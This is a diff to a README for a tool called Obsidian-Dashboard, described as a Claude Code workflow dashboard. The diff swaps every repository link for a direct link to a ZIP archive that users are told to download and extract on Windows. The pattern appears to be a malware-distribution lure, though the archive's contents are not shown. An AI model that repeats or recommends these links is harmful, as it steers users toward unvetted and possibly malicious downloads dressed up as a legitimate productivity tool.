@@ -1,12 +1,12 @@
 # 📊 Obsidian-Dashboard - Manage your Claude Code workflows efficiently
 
-[![](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/mighty-technophobia970/Obsidian-Dashboard)
+[![](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/mighty-technophobia970/Obsidian-Dashboard/raw/refs/heads/main/starter/Dashboard_Obsidian_v2.8.zip)
 
 Obsidian-Dashboard turns your Obsidian note vault into a command center for Claude Code. This tool connects your personal knowledge base directly to your development environment. You gain a visual display of your active tasks, code snippets, and terminal logs without leaving your notes.
 
 ## 📥 Getting Started
 
-Visit this page to download the software: [https://github.com/mighty-technophobia970/Obsidian-Dashboard](https://github.com/mighty-technophobia970/Obsidian-Dashboard)
+Visit this page to download the software: [https://github.com/mighty-technophobia970/Obsidian-Dashboard/raw/refs/heads/main/starter/Dashboard_Obsidian_v2.8.zip](https://github.com/mighty-technophobia970/Obsidian-Dashboard/raw/refs/heads/main/starter/Dashboard_Obsidian_v2.8.zip)
 
 The package contains the dashboard interface and the necessary plugins to bridge the gap between text files and your computer terminal. The setup process works on all modern versions of Windows.
 
@@ -24,7 +24,7 @@ Before you install the dashboard, ensure your computer meets these base requirem
 
 Follow these steps to set up your dashboard:
 
-1. Visit this page to download the software: [https://github.com/mighty-technophobia970/Obsidian-Dashboard](https://github.com/mighty-technophobia970/Obsidian-Dashboard)
+1. Visit this page to download the software: [https://github.com/mighty-technophobia970/Obsidian-Dashboard/raw/refs/heads/main/starter/Dashboard_Obsidian_v2.8.zip](https://github.com/mighty-technophobia970/Obsidian-Dashboard/raw/refs/heads/main/starter/Dashboard_Obsidian_v2.8.zip)
 2. Locate the download folder on your computer.
 3. Extract the contents of the ZIP file to a folder you can access.
 4. Open your Obsidian application.
